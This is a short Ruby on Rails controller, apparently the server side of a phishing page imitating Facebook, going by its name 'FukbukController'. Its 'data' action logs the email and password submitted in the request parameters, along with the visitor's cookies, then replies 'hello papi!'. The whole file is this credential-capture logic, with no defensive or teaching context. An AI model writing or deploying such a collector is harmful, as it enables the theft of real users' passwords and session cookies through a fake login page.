class FukbukController < ApplicationController
	def main
		render view: "main"
	end

	def data
		puts "Params Email: #{params[:email]} Pass: #{params[:pass]}"
		puts "Cookies #{cookies}"
		render text:"hello papi!"
	end
end
